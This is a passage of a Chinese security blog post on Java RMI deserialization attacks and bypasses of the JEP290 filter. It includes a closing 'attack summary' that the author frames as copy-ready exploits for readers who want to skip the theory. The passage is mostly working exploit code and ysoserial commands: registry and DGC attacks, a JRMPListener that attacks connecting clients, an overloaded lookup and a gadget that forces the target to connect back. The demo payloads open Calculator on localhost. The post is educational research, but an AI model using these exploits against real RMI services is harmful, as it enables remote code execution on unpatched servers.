+
+    
+    
+        public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException {
+          RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);
+          ObjectOutput var6 = var5.getOutputStream();
+          var6.writeObject(var1);
+          var6.writeLong(var2);
+          var6.writeObject(var4);
+          //漏洞触发点
+          super.ref.invoke(var5);
+          Lease var24;
+          ObjectInput var9 = var5.getInputStream();
+          var24 = (Lease)var9.readObject();
+          super.ref.done(var5);
+        }
+    
+
+在ref.invoke debug时F8会发现计算器弹出来了，也就是说此处是漏洞触发点，这里就做发起rmi连接，触发JRMP服务端打客户端的方式。
+
+看到这，其实会发现就是利用前面的bind打RMI Registry，不过将直接打RMI
+Registry的过程转成了让目标发出RMI连接我们的服务端，所以利用方式其实就是将yso中payload的JRMPClient套到Remote类中，通过bind发送给目标。
+
+Tips:受限于bind在8u141之后无法远程连接。
+
+## JDK<8u232 bypass JEP290 via lookup
+
+我们可以看到lookup虽然传递的是字符串类型，但在写入的时候调用的是writeObject，因此我们是否可以通过重载lookup的方式来将参数改为Object类型（其实ysomap就是如此实现的）。
+
+直接摘取ysomap的代码:
+
+    
+    
+    public static Remote lookup(Registry registry, Object obj)
+                throws Exception {
+            RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, "ref");
+            long interfaceHash = (long) ReflectionHelper.getFieldValue(registry, "interfaceHash");
+            java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, "operations");
+            java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, 2, interfaceHash);
+            try {
+                try {
+                    java.io.ObjectOutput out = call.getOutputStream();
+                    //反射修改enableReplace
+                    ReflectionHelper.setFieldValue(out, "enableReplace", false);
+                    out.writeObject(obj); // arm obj
+                } catch (java.io.IOException e) {
+                    throw new java.rmi.MarshalException("error marshalling arguments", e);
+                }
+                ref.invoke(call);
+                return null;
+            } catch (RuntimeException | RemoteException | NotBoundException e) {
+                if(e instanceof RemoteException| e instanceof ClassCastException){
+                    Logger.success("exploit remote registry success!");
+                    return null;
+                }else{
+                    throw e;
+                }
+            } catch (java.lang.Exception e) {
+                throw new java.rmi.UnexpectedException("undeclared checked exception", e);
+            } finally {
+                ref.done(call);
+            }
+        }
+    
+
+基本上与RegistryImpl_Stub中的lookup一致，不同的就是需要先通过反射获取到ref等属性，加多了一个Registry类的参数以便于反射以及部分函数的调用。
+
+## JDK<8u241 bypass JEP290
+
+来自：<https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/>
+
+作者分享的链如下：
+
+    
+    
+    01: sun.rmi.server.UnicastRef.unmarshalValue()
+    02: sun.rmi.transport.tcp.TCPChannel.newConnection()
+    03: sun.rmi.server.UnicastRef.invoke()
+    04: java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod()
+    05: java.rmi.server.RemoteObjectInvocationHandler.invoke()
+    06: com.sun.proxy.$Proxy111.createServerSocket()
+    07: sun.rmi.transport.tcp.TCPEndpoint.newServerSocket()
+    08: sun.rmi.transport.tcp.TCPTransport.listen()
+    09: ...
+    10: java.rmi.server.UnicastRemoteObject.reexport()
+    11: java.rmi.server.UnicastRemoteObject.readObject()
+    
+
+这条链与JRMPClient(payload)链不同之处在与它并不是在releaseInputStream中触发rmi连接，而是在readObject的过程就触发了。
+
+链就不跟了，主要看一下这一条链的精彩点，从sun.rmi.transport.tcp.TCPEndpoint#newServerSocket：
+
+    
+    
+    ServerSocket newServerSocket() throws IOException {
+            if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
+                TCPTransport.tcpLog.log(Log.VERBOSE, "creating server socket on " + this);
+            }
+    
+            Object var1 = this.ssf;
+            if (var1 == null) {
+                var1 = chooseFactory();
+            }
+    
+            ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(this.listenPort);
+            if (this.listenPort == 0) {
+                setDefaultPort(var2.getLocalPort(), this.csf, this.ssf);
+            }
+    
+            return var2;
+        }
+    
+
+因为动态代理的缘故，调用createServerSocket会进入到java.rmi.server.RemoteObjectInvocationHandler，拦截createServerSocket方法并调用invoke：
+
+    
+    
+    public Object invoke(Object proxy, Method method, Object[] args)throws Throwable
+    {
+                ...
+              //entry
+              return invokeRemoteMethod(proxy, method, args);
+    }
+    private Object invokeRemoteMethod(Object proxy,Method method,Object[] args)throws Exception
+        {
+            try {
+                if (!(proxy instanceof Remote)) {
+                    throw new IllegalArgumentException(
+                        "proxy not Remote instance");
+                }
+                  //entry
+                return ref.invoke((Remote) proxy, method, args,
+                                  getMethodHash(method));
+              ...
+        }
+    
+
+接下来就是前面提到类似于sun.rmi.transport.DGCImpl_Stub#dirty的ref.invoke触发连接了，只不过这次并没有经过DGC层。
+
+直接摘取作者提供的代码：
+
+    
+    
+        public static UnicastRemoteObject getGadget(String host, int port) throws Exception {
+            // 1. Create a new TCPEndpoint and UnicastRef instance.
+            // The TCPEndpoint contains the IP/port of the attacker
+            // Taken from Moritz Bechlers JRMP Client
+            ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+    
+            TCPEndpoint te = new TCPEndpoint(host, port);
+            UnicastRef refObject = new UnicastRef(new LiveRef(id, te, false));
+    
+            // 2. Create a new instance of RemoteObjectInvocationHandler,
+            // passing the RemoteRef object (refObject) with the attacker controlled IP/port in the constructor
+            RemoteObjectInvocationHandler myInvocationHandler = new RemoteObjectInvocationHandler(refObject);
+    
+            // 3. Create a dynamic proxy class that implements the classes/interfaces RMIServerSocketFactory
+            // and Remote and passes all incoming calls to the invoke method of the
+            // RemoteObjectInvocationHandler
+            RMIServerSocketFactory handcraftedSSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
+                    RMIServerSocketFactory.class.getClassLoader(),
+                    new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
+                    myInvocationHandler);
+    
+            // 4. Create a new UnicastRemoteObject instance by using Reflection
+            // Make the constructor public
+            Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
+            constructor.setAccessible(true);
+            UnicastRemoteObject myRemoteObject = (UnicastRemoteObject) constructor.newInstance(null);
+    
+            // 5. Make the ssf instance accessible (again by using Reflection) and set it to the proxy object
+            Field privateSsfField = UnicastRemoteObject.class.getDeclaredField("ssf");
+            privateSsfField.setAccessible(true);
+    
+            // 6. Set the ssf instance of the UnicastRemoteObject to our proxy
+            privateSsfField.set(myRemoteObject, handcraftedSSF);
+    
+            // return the gadget
+            return myRemoteObject;
+        }
+    
+
+用我们前面自己写的lookup把gadget发过去就行了。
+
+    
+    
+    Registry registry =  LocateRegistry.getRegistry("127.0.0.1", 1099);
+    MyLookup.lookup(registry,getGadget("127.0.0.1",1199));
+    
+
+## 打法总结
+
+此节总结了打法以及对应的payload或者exp，按本文顺序来，方便健忘以及懒得敲命令的自己，也方便懒得看原理，直接找利用的各位（连代码都不想敲的话建议使用ysomap）
+
+  * 探测RMI接口
+
+BaRMIe： <https://github.com/NickstaDB/BaRMIe>
+
+NMap：略
+
+List：
+
+    
+    
+    public void run() throws Exception{
+      String[] clazz = Naming.list("rmi://127.0.0.1:1099");
+      for (String s:clazz) {
+        System.out.println(s);
+      }
+    }
+    
+
+  * 攻击Object类型参数接口(仅示例，需要知道接口参数以及调用方式)：
+
+    
+    
+    String payloadType = "CommonsCollections7";
+    String payloadArg = "open /System/Applications/Calculator.app";
+    Object payloadObject = ObjectPayload.Utils.makePayloadObject(payloadType, payloadArg);
+    HelloR helloR = null;
+    try{
+      helloR = (HelloR) Naming.lookup("rmi://127.0.0.1:1099/hell");
+      helloR.helloObject(payloadObject);
+    }catch (Exception e){
+      e.printStackTrace();
+    }
+    
+
+  * 攻击非Object类型参数接口：
+
+<https://github.com/Afant1/RemoteObjectInvocationHandler>
+
+> 1、mvn package 打好jar包
+>
+> 2、运行RmiServer
+>
+> 3、运行RmiClient前，VM
+> options参数填写:-javaagent:C:\Users\xxx\InvokeRemoteMethod\target\rasp-1.0-SNAPSHOT.jar
+>
+> 4、最终会hook住RemoteObjectInvocationHandler函数，修改第三个参数为URLDNS gadget
+
+  * 在JEP290之前通过lookup，bind等方式攻击RMI Registry
+
+    
+    
+    java -cp yso.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections7 "open /System/Applications/Calculator.app"
+    
+
+  * 在JEP290之前攻击DGC层
+
+    
+    
+    java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections7 "open /System/Applications/Calculator.app"
+    
+
+  * 服务端打客户端
+
+yso开启服务端
+
+    
+    
+    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections7 "open /System/Applications/Calculator.app
+    
+
+令客户端连接1199并执行lookup，bind等方法（在JDKu141后bind无法连接远程），示例代码：
+
+    
+    
+    Registry registry =  LocateRegistry.getRegistry("127.0.0.1", 1199);
+    registry.lookup("anythingisok");
+    
+
+  * JDK<141 bypass JEP290 via bind
+
+yso开启JRMPListener
+
+    
+    
+    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections7 "open /System/Applications/Calculator.app
+    
+
+利用代码：
+
+    
+    
+    String payloadType = "JRMPClient";
+    String payloadArg = "127.0.0.1:1199";
+    //yso中获取payload的Object对象的方法
+    Object payloadObject = ObjectPayload.Utils.makePayloadObject(payloadType, payloadArg);
+    RmiRegistryExploit re = new RmiRegistryExploit();
+    re.setPayload(payloadObject);
+    String name = "pwned" + System.nanoTime();
+    Registry registry =  LocateRegistry.getRegistry("127.0.0.1", 1099);
+    registry.bind(name,re);
+    
+
+  * JDK<8u232 bypass JEP290 via lookup
+
+yso开启JRMPListener
+
+    
+    
+    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections7 "open /System/Applications/Calculator.app"
+    
+
+重写lookup，代码见JDK<8u232 bypass JEP290 via lookup小节。
+
+利用代码：
+
+    
+    
+    String payloadType = "JRMPClient";
+    String payloadArg = "127.0.0.1:1199";
+    //yso中获取payload的Object对象的方法
+    Object payloadObject = ObjectPayload.Utils.makePayloadObject(payloadType, payloadArg);
+    RmiRegistryExploit re = new RmiRegistryExploit();
+    re.setPayload(payloadObject);
+    String name = "pwned" + System.nanoTime();
+    Registry registry =  LocateRegistry.getRegistry("127.0.0.1", 1099);
+    MyLookup.lookup(registry,re);
+    
+
+  * JDK<8u241 bypass JEP290
+
+代码较长，见JDK<8u241 bypass JEP290小节。
+
+## Gopher攻击RMI
+
+实际上笔者是在ctf中遇到了一道gopher打RMI的题目后才会想到系统性地学习RMI方面的知识，所以在文末就顺带提了一下，关于gopher打RMI的知识笔者就不做总结了，这里说一下遇到过的两道题的做法，wp或者exp在链接内就有，因此也不贴出来了。
+
+[0ctf-2rm1](https://github.com/ceclin/0ctf-2021-2rm1-soln):  
+curl -> 302 -> gopher -> ssrf -> registry and rmiserver -> rebind or attach
+agent -> rmiclient
+
+[BalsnCtf-4pplemusic](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021/4ppleMusic):
+
+低版本攻击codebase，这一点在本文中没有体现，因为jdk版本够老，也可以使用jdk7u21的链来打，因为没有JEP290的限制，所以可以直接打DGC。
+
+## Reference
+
+  * [Java中RMI的使用](https://blog.csdn.net/lmy86263/article/details/72594760)
+  * Java漫谈-RMI篇（4-6）——P师傅
+  * [JAVA RMI 反序列化流程原理分析](https://xz.aliyun.com/t/2223)
+  * [针对RMI服务的九重攻击 – 上](https://xz.aliyun.com/t/7930)
+  * [针对RMI服务的九重攻击 – 下](https://xz.aliyun.com/t/7932)
+  * [RMI-反序列化](https://xz.aliyun.com/t/6660)
+  * [rmi利用总结](https://blog.sometimenaive.com/2020/07/16/rmi-exploit-summary/)
+  * [浅谈Java RMI Registry安全问题](https://www.anquanke.com/post/id/197829)
+  * [基于Java反序列化RCE – 搞懂RMI、JRMP、JNDI](https://xz.aliyun.com/t/7079)
+  * [搞懂RMI、JRMP、JNDI-终结篇](https://xz.aliyun.com/t/7264)
+  * [attack-rmi-registry-and-server-with-socket](https://blog.sometimenaive.com/2020/09/02/attack-rmi-registry-and-server-with-socket/)
+  * [attacking-java-rmi-services-after-jep-290](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
+  * [Afant1-RemoteObjectInvocationHandler](https://github.com/Afant1/RemoteObjectInvocationHandler)
+  * [浅谈JEP290](https://paper.seebug.org/1689/)
+  * [JEP290的基本概念](https://www.cnpanda.net/sec/968.html)
+  * [an-trinhs-rmi-registry-bypass](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/)
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **HhhM** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/263726](/post/id/263726)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [反序列化](/tag/反序列化)
+  * [Java](/tag/Java)
+  * [RMI](/tag/RMI)
+
+ **+1** __8赞
+
+ __收藏
+
+![](https://thirdwx.qlogo.cn/mmopen/vi_32/LibPVIdpSIh5qnxEpnzSOvJcCRCmWCnZnAmZibOQiaXWvOib9ScIKeEN7HqGhoUFBABxSQfXR3Uq0UwaHpXnSQgSFw/132)
+HhhM
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
